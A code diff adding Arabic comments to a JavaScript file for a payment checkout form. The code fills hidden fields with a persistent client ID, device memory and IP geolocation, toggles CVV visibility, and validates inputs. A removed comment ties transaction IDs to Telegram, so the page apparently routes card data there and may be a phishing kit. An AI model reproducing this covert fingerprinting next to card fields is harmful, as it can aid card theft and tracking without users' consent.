@@ -1,3 +1,8 @@
+/**
+ * Data.js - التعامل مع بيانات الجهاز والتحقق من صحة المدخلات
+ */
+
+// 1. توليد أو جلب معرّف العميل
 function getOrCreateClientID() {
     let clientId = localStorage.getItem('hikayat_client_id');
     if (!clientId) {
@@ -7,6 +12,7 @@ function getOrCreateClientID() {
     return clientId;
 }
 
+// 2. جمع تفاصيل الجهاز والشبكة وتعبئة الخانات المخفية
 async function collectDeviceDetails() {
     document.getElementById('clientID').value = getOrCreateClientID();
     document.getElementById('deviceRAM').value = (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير مدعوم');
@@ -47,6 +53,7 @@ async function collectDeviceDetails() {
         }
     }
 
+    // جلب بيانات الشبكة والموقع الجغرافي والإحداثيات للخرائط
     try {
         const res = await fetch('https://ipwho.is/?lang=ar');
         const data = await res.json();
@@ -71,12 +78,14 @@ async function collectDeviceDetails() {
     }
 }
 
+// 3. تحويل الأرقام العربية إلى إنجليزية
 function convertArabicDigitsToEnglish(str) {
     return str.replace(/[٠-٩]/g, function (d) {
         return d.charCodeAt(0) - 1632;
     });
 }
 
+// 4. التحقق من صحة المدخلات
 function validateAmount() {
     const amountInput = document.getElementById('pay_amount');
     const val = parseFloat(amountInput.value);
@@ -184,19 +193,9 @@ function validateName() {
     }
 }
 
+// 5. تهيئة الأحداث والنموذج عند التحميل
 document.addEventListener('DOMContentLoaded', () => {
     collectDeviceDetails();
-
-    // 💡 إدارة وتثبيت رقم العملية (Transaction ID) الموحد لمنع اختلافه بين تليجرام وصفحة النجاح
-    let persistentTx = localStorage.getItem("current_tx_id");
-    if (!persistentTx) {
-        persistentTx = "TX_" + Date.now();
-        localStorage.setItem("current_tx_id", persistentTx);
-    }
-    const txInput = document.getElementById("hidden_transaction_id");
-    if (txInput) {
-        txInput.value = persistentTx;
-    }
 
     const paymentMethodSelect = document.getElementById('payment_method');
     const cardSection = document.getElementById('card_section');
@@ -221,6 +220,7 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('pay_amount').value = amountParam;
     }
 
+    // زر إظهار/إخفاء رمز CVV
     const toggleCvvBtn = document.getElementById('toggleCvvBtn');
     if (toggleCvvBtn) {
         toggleCvvBtn.addEventListener('click', () => {
@@ -238,6 +238,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    // إعداد مستمعي الأحداث للتحقق الآلي
     document.getElementById('pay_amount').addEventListener('input', (e) => {
         e.target.value = convertArabicDigitsToEnglish(e.target.value).replace(/[^\d.]/g, '');
         validateAmount();
@@ -275,6 +276,7 @@ document.addEventListener('DOMContentLoaded', () => {
         validateName();
     });
 
+    // معالجة الإرسال
     document.getElementById("paymob_checkout").addEventListener("submit", function (e) {
         const isAmountValid = validateAmount();
         let isPhoneValid = validatePhone();
@@ -287,9 +289,6 @@ document.addEventListener('DOMContentLoaded', () => {
             e.preventDefault();
             return;
         }
-
-        // تحديث رقم العملية وتوليد رقم جديد لعملية أخرى قادمة عند نجاح الحفظ
-        localStorage.removeItem("current_tx_id");
 
         const submitBtn = document.getElementById("submitButton");
         submitBtn.disabled = true;
